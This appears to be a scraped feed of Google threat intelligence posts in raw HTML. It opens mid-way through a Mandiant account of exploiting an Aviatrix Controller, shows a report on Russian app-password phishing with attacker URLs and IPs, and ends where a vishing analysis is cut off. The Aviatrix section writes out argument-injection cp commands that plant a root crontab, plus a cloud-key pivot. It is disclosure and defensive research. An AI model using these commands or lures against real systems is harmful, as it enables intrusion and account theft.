#5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><code><span style=\"vertical-align: baseline;\">/usr/bin/cp </span><span style=\"vertical-align: baseline; color: #1a73e8;\">/var/avxui/test_proxy_connectivity-server_ca_cert.txt</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline; color: #d93025;\">crontab</span></code></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Since the command is executed at the root of the filesystem, the command would copy </span><span style=\"color: #1a73e8;\"><code style=\"vertical-align: baseline;\">/var/avxui/test_proxy_connectivity-server_ca_cert.txt</code></span><span style=\"vertical-align: baseline;\">, over to </span><code style=\"vertical-align: baseline;\"><span style=\"color: #d93025;\">/crontab</span></code><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">3. Finally, we trigger the bug once more to move the </span><code style=\"vertical-align: baseline;\"><span style=\"color: #d93025;\">/crontab</span></code><span style=\"vertical-align: baseline;\"> file to the </span><code style=\"vertical-align: baseline;\"><span style=\"color: #d93025;\">/etc</span></code><span style=\"vertical-align: baseline;\"> folder, shown in Figure 8.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Moving the local file to the /etc folder\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/aviatrix-fig8.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 8: Moving the local file to the /etc folder</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The literal command that is executed following that HTTP request is:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><code><span style=\"vertical-align: baseline;\">/usr/bin/cp </span><span style=\"vertical-align: baseline; color: #1a73e8;\">/var/avxui/test_proxy_connectivity-server_ca_cert.txt</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline; color: #d93025;\">crontab</span><span style=\"vertical-align: baseline;\"> <br />etc --suffix /usr/local/share/ca-certificates/<br />test_proxy_connectivity-server_ca_cert.crt</span></code></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The </span><code style=\"vertical-align: baseline;\">cp</code><span style=\"vertical-align: baseline;\"> command can be shortened to the following:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><code><span style=\"vertical-align: baseline;\">/usr/bin/cp </span><span style=\"vertical-align: baseline; color: #1a73e8;\">/var/avxui/test_proxy_connectivity-server_ca_cert.txt</span><span style=\"vertical-align: baseline;\"> <br /></span><span style=\"color: #d93025;\"><span style=\"vertical-align: baseline;\">crontab</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">etc</span></span></code></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Because there are more than two files passed to </span><code style=\"vertical-align: baseline;\">cp</code><span style=\"vertical-align: baseline;\">, the last file is expected to be a directory. This command will essentially copy both </span><code style=\"vertical-align: baseline;\"><span style=\"color: #1a73e8;\">/var/avxui/test_proxy_connectivity-server_ca_cert.txt</span></code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\"><span style=\"color: #d93025;\">crontab</span></code><span style=\"vertical-align: baseline;\"> over to </span><code style=\"vertical-align: baseline;\"><span style=\"color: #d93025;\">/etc</span></code><span style=\"vertical-align: baseline;\">, completing the exploit chain.</span></p>\n<p><span style=\"vertical-align: baseline;\">And sure enough, within a minute, and every minute after that, we got a </span><code style=\"vertical-align: baseline;\">curl</code><span style=\"vertical-align: baseline;\"> callback! This is shown in Figure 9.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Crontab successfully executing the curl command\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/aviatrix-fig9.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 9: Crontab successfully executing the curl command</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The execution context was also under root, inherited from crontab, which was incredibly convenient from an attacker's perspective. </span></p>\n<p><span style=\"vertical-align: baseline;\">This confirmed our successful exploitation of a fully patched Aviatrix Controller, via Authentication Bypass, Unsafe File Upload, and Argument Injection.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Cloud Pivots</span></h2>\n<p><span style=\"vertical-align: baseline;\">This was the end of the road for the Initial Access team, but the beginning of the engagement for the Red Team operators. The last step for us was to capitalize on this access by obtaining Cloud administrator privileges. From a compromised Aviatrix Controller, the AWS IMDSv2 endpoint could be queried to obtain ephemeral cloud keys. </span></p>\n<p><span style=\"vertical-align: baseline;\">This should grant access to the ARN \"</span><code style=\"vertical-align: baseline;\">arn:aws:sts::[...]:assumed-role/Aviatrix-role-ec2</code><span style=\"vertical-align: baseline;\">\", which by design has access to basically nothing. To obtain cloud keys for the privileged Aviatrix role, we had to perform an Assume Role, as documented in </span><a href=\"https://docs.aviatrix.com/documentation/latest/platform-administration/accounts-and-users/iam-role.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Aviatrix's documentation</span></a><span style=\"vertical-align: baseline;\">. </span></p>\n<p><span style=\"vertical-align: baseline;\">With a configured AWS profile, we ran:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\"><code><span style=\"vertical-align: baseline;\">$ aws sts assume-role --role-arn \"arn:aws:iam::[...]:<br />role/aviatrix-role-app\" --role- session-name \"AviatrixSession\"</span></code></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Which granted us with a new set of ephemeral AWS keys, which now had access to EC2s, S3 buckets, etc.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Conclusion</span></h2>\n<p><span style=\"vertical-align: baseline;\">An especially restricted attack surface forced us to go against an unusual target, a Software-Defined Networking (SDN) controller. Through code review, patience, and lots of luck, the Mandiant Initial Access Team breached the client's Aviatrix Controller, and later their cloud environments, by exploiting two newly discovered vulnerabilities. </span></p>\n<p><span style=\"vertical-align: baseline;\"> </span></p>\n<h2><span style=\"vertical-align: baseline;\">Timeline</span></h2>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">March 10, 2025: Initial report to the Aviatrix helpdesk</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">March 12, 2025: Escalated the issue to Aviatrix leadership</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">March 12, 2025: Call with Aviatrix engineers and leadership to describe the issues</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">March 31, 2025: Patch released to customers</span></p>\n</li>\n</ul></div>"}
{"source": "Threat Intelligence", "title": "What’s in an ASP? Creative Phishing Attack on Prominent Academics and Critics of Russia", "link": "https://cloud.google.com/blog/topics/threat-intelligence/creative-phishing-academics-critics-of-russia/", "published": "Wed, 18 Jun 2025 14:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><p>Written by: Gabby Roncone, Wesley Shields</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><h3>UPDATE (July 10)</h3>\n<p><span style=\"vertical-align: baseline;\">In late June 2025, Google Threat Intelligence Group (GTIG) discovered continued UNC6293 operations that demonstrate an evolution in the group’s tradecraft. Using similar lure themes as previously observed activity, UNC6293 continued the ASP phishing campaign against prominent academics, critics of Russia, and journalists using different ASP names, potentially as a response to our publication of their tradecraft. In a different campaign, UNC6293 sought to convince targets to link an attacker-controlled device to their Microsoft 365 account through Microsoft’s device code authentication flow.</span></p>\n<p><span style=\"vertical-align: baseline;\">In an attempt to continue the ASP campaign, UNC6293 attempted to re-establish contact with specific individuals that had previously engaged with the initial phishing attempts. GTIG observed UNC6293 creating multiple new accounts with similar usernames to ones used previously and already disabled. UNC6293 also used different ASP names in this continuation wave of the campaign. Due to the engagement with their initial campaign, UNC6293 demonstrated a desire to keep the ruse of being State Department employees alive and re-engage with specific individual targets from the previous campaign.</span></p>\n<p><span style=\"vertical-align: baseline;\">UNC6293 also began to send tailored invitations to virtual meetings through calendar invites. These invitations included links to Zoom and Google Meet as well as a Microsoft authentication URL for an attacker controlled application. </span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>https://login.microsoft[.]com/&lt;redacted&gt;/oauth2/authorize?client_id=\nfc45d3d0-d870-4c83-b3f7-08ebca61d3a0&amp;prompt=\nnone&amp;response_mode=form_post</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Clicking the Microsoft authentication URL starts a redirect chain that includes an actor-controlled domain:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>https://rediruri[.]app/&lt;redacted&gt;</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The attacker-controlled URL is only visible in the browser for a short period of time before it redirects the target to a Microsoft 365 authentication page (Figure 4).</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Microsoft O365  authentication page after redirect\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/russia-asp-fig6.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 4: Microsoft 365 authentication page after redirect</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Given the demonstrated patience, persistence and creativity of this threat actor, GTIG strongly recommends following the mitigations outlined in the initial version of this blog post to protect against any further ASP phishing campaigns from UNC6293 or other threat actors. Social engineering attacks abusing legitimate authentication features are difficult to defend against; as a result, we suggest individuals who may be targeted by this group use Google’s enhanced security resources such as the Advanced Protection Program (APP).</span></p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Introduction</span></h3>\n<p><span style=\"vertical-align: baseline;\">In cooperation with external partners, Google Threat Intelligence Group (GTIG) observed a Russia state-sponsored cyber threat actor impersonating the U.S. Department of State. From at least April through early June 2025, this actor targeted prominent academics and critics of Russia, often using extensive rapport building and tailored lures to convince the target to set up </span><a href=\"https://support.google.com/accounts/answer/185833?hl=en\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">application specific passwords</span></a><span style=\"vertical-align: baseline;\"> (ASPs). Once the target shares the ASP passcode, the attackers establish persistent access to the victim’s mailbox. Two distinct campaigns are detailed in this post. This activity aligns with </span><a href=\"https://citizenlab.ca/2025/06/russian-government-linked-social-engineering-targets-app-specific-passwords/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Citizen Lab’s recent research</span></a><span style=\"vertical-align: baseline;\"> on social engineering attacks against ASPs, another useful resource for high risk users.</span></p>\n<p><span style=\"vertical-align: baseline;\">GTIG tracks this activity as UNC6293, a likely Russia state-sponsored cyber actor we assess with low confidence is associated with </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/apt29-wineloader-german-political-parties\"><span style=\"vertical-align: baseline;\">APT29</span></a><span style=\"vertical-align: baseline;\"> / ICECAP. After establishing rapport, the attacker sent phishing lures disguised as meeting invitations, and added spoofed Department of State email addresses on the cc line of the initial outreach to increase the legitimacy of the contact attempt. The initial phishing email itself is not directly malicious, but encourages the victim to respond to set up a meeting.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Keir Giles, a prominent British researcher on Russia, posted this screenshot of an email header with fake U.S. Department of State emails that was part of a UNC6293 campaign\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/russia-asp-fig1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: Keir Giles, a prominent British researcher on Russia, <a href=\"https://www.linkedin.com/posts/keir-giles-499a489_hack-alert-several-of-my-email-accounts-activity-7339380839400546305-A6EK/?utm_source=share&amp;utm_medium=member_desktop&amp;rcm=ACoAABVut9oBUCG1b2AlrX2f6UlpfOMGSOHMMQg\">posted</a> this screenshot of an email header with fake U.S. Department of State emails that was part of a UNC6293 campaign</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Targets who responded received an email with a benign </span><a href=\"https://www.virustotal.com/gui/file/329fda9939930e504f47d30834d769b30ebeaced7d73f3c1aadd0e48320d6b39/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">PDF lure</span></a><span style=\"vertical-align: baseline;\"> attached. The State Department themed lure is customized to the target and contains instructions to securely access a fake Department of State cloud environment. This included directing victims to go to </span><a href=\"https://account.google.com\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">https://account.google.com</code></a><span style=\"vertical-align: baseline;\"> and create an </span><a href=\"https://support.google.com/accounts/answer/185833?hl=en\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Application Specific Password (ASP)</span></a><span style=\"vertical-align: baseline;\"> or “app passwords.” ASPs are randomly generated 16-character passcodes that allow third-party applications to access your Google Account, intended for applications and devices that do not support features like 2-step verification (2SV). To use an ASP you must set it up and provide a name for the application.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Benign PDF document with instructions\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/russia-asp-fig2.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 2: <a href=\"https://www.virustotal.com/gui/file/329fda9939930e504f47d30834d769b30ebeaced7d73f3c1aadd0e48320d6b39/\">Benign PDF document</a> with instructions</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In campaign one, the ASP name suggested in the lure PDF was “ms.state.gov” and in campaign two, we observed a Ukrainian and Microsoft themed ASP name. After creating the ASP, the attackers directed the target to send them the 16-character code. The attackers then set up a mail client to use the ASP, likely with the end goal of accessing and reading the victim’s email correspondence. This method also allows the attackers to have persistent access to accounts.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table style=\"width: 99.9641%;\"><colgroup><col style=\"width: 17.6394%;\" /><col style=\"width: 16.8569%;\" /><col style=\"width: 33.3203%;\" /><col style=\"width: 32.1443%;\" /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">Campaign</span><span style=\"vertical-align: baseline;\"> </span></strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">Sender Theme</span></strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">ASP Name</span></strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong><span style=\"vertical-align: baseline;\">Attacker Infrastructure Used</span></strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Campaign 1</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">State Department</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">ms.state.gov</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">91.190.191.117 - Residential proxy</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Campaign 2</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Unknown</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Ukrainian and Microsoft-themed ASP</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">91.190.191.117 - Residential proxy</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Attackers logged into victim accounts primarily using residential proxies and VPS servers, in some cases re-using infrastructure to access different victim or attacker accounts. As a result, we were able to connect the two distinct campaigns we observed to the same cluster. We have re-secured the Gmail accounts compromised by these campaigns.</span></p>\n<h3 style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Mitigations</span></h3>\n<p><span style=\"vertical-align: baseline;\">GTIG is committed to our mission of understanding and countering advanced threats. We use the results of our research to ensure that Google's products are secure and to protect our users and enterprise customers. </span></p>\n<p><span style=\"vertical-align: baseline;\">Users have complete control over their ASPs and may </span><a href=\"https://support.google.com/accounts/answer/185833?hl=en\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">create or revoke</span></a><span style=\"vertical-align: baseline;\"> them on demand. </span><span style=\"vertical-align: baseline;\">Upon creation, Google sends a notification to the corresponding account Gmail, recovery email address, and any device signed in with that Google account to ensure the user intended to enable this form of authentication. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Google Account Help documentation on app passwords\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/russia-asp-fig3.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3: <a href=\"https://support.google.com/accounts/answer/185833?hl=en\">Google Account Help documentation</a> on app passwords</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Google provides enhanced security </span><a href=\"https://blog.google/technology/safety-security/online-safety-resources/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">resources</span></a><span style=\"vertical-align: baseline;\"> such as the </span><a href=\"https://landing.google.com/advancedprotection/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Advanced Protection Program</span></a><span style=\"vertical-align: baseline;\"> (APP), intended for individuals at high risk of targeted attacks and exposure to other serious threats. Opting to use the APP prevents an account from creating an ASP due to the program’s heightened security requirements.</span></p>\n<p><span style=\"vertical-align: baseline;\">We are committed to sharing our findings with the security community and with companies and individuals that may have been targeted by these activities, and we hope that improved understanding of tactics and techniques will enhance threat hunting capabilities and lead to stronger user protections across the industry.</span></p>\n<h3 style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Lure PDF Document</span></h3>\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">SHA256: 329fda9939930e504f47d30834d769b30ebeaced7d73f3c1aadd0e48320d6b39</span></p></div>"}
{"source": "Threat Intelligence", "title": "Hello, Operator? A Technical Analysis of Vishing Threats", "link": "https://cloud.google.com/blog/topics/threat-intelligence/technical-analysis-vishing-threats/", "published": "Wed, 04 Jun 2025 15:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><p>Written by: Nick Guttilla</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Introduction</span></h2>\n<p><span style=\"vertical-align: baseline;\">Organizations are increasingly relying on diverse digital communication channels for essential business operations. The way employees interact with colleagues, access corporate resources, and especially, receive information technology (IT) support is often conducted through calls, chat platforms, and other remote technologies</span><span style=\"vertical-align: baseline;\">. </span><span style=\"vertical-align: baseline;\">While these various available methods enhance both efficiency and global accessibility, they also introduce an expanded attack surface that can pose a significant risk if overlooked. Prevalence of in-person social interactions has diminished and remote IT structures, such as an outsourced service desk, has normalized employees' engagement with external or less familiar personnel. As a result, threat actors continue to use social engineering tactics.</span></p></div>\n<div class=\"block-paragraph_advanced\"><h2>Vishing in the Wild: A Tale of Two Actors</h2>\n<p><span style=\"vertical-align: baseline;\">Social engineering is the psychological manipulation of people into performing unsolicited actions or divulging confidential information. It is an effective strategy that preys on human emotions and built-in vulnerabilities like trust and the desire to be helpful. Financially motivated threat actors have increasingly adopted voice-based social engineering, or \"vishing,\" as a primary vector for initial access, though their specific methods and end goals can vary significantly.</span></p>\n<p><span style=\"vertical-align: baseline;\">Two prominent examples illustrate the versatility of this threat. The cluster tracked as </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/\"><span style=\"text-decoration: underline; vertical-align: baseline;\">UNC3944</span></a><span style=\"vertical-align: baseline;\"> (which overlaps with \"Scattered Spider\") has historically used vishing as a flexible entry point for a range of criminal enterprises. Their operators frequently call corporate service desks, impersonating employees to have credentials and multi-factor authentication (MFA) methods reset. This access is then leveraged for broader attacks, including SIM swapping, ransomware deployment, and data theft extortion.</span></p>\n<p><span style=\"vertical-align: baseline;\">More recently, the financially motivated actor </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/voice-phishing-data-extortion\"><span style=\"text-decoration: underline; vertical-align: baseline;\">UNC6040</span></a><span style=\"vertical-align: baseline;\"> has demonstrated a different vishing playbook. Its operators also impersonate IT support, but with the specific goal of deceiving employees into navigating to Salesforce’s connected app page and authorizing a malicious, actor-controlled version of the Data Loader application. This single action grants the actor the ability to perform large-scale data exfiltration from the victim's Salesforce environment, which is then used for subsequent extortion attempts. While both actors rely on vishing, their distinct objectives—UNC3944’s focus on account takeover for broad network access versus UNC6040’s targeted theft of CRM data—highlight the diverse risks organizations face from this tactic.</span></p>\n<p><span style=\"vertical-align: baseline;\">By reviewing the techniques, tactics, and procedures (TTPs) of actors like UNC3944 and UNC6040, organizations can better assess their own internal policies and guidelines when it comes to employee identification and protection of infrastructure and confidential data. Red teamers can also learn from their methodologies to better emulate real-world attacks and assist organizations in developing defense-in-depth strategies.</span></p>\n<p><span style=\"vertical-align: baseline;\">Mandiant has successfully used the following approaches to perform voice-based social engineering during Red Team Assessments for clients of varying sizes. The described techniques have enabled Mandiant to mimic TTPs from sophisticated vishing actors like UNC3944 and UNC6040, resulting in administrative-level user impersonation, corporate network perimeter breaches, and sensitive data access. Mandiant has additionally convinced multiple service desks to reset credentials and alter several forms of MFA. These simulated incidents have empowered organizations to proactively identify and resolve deficiencies that otherwise may 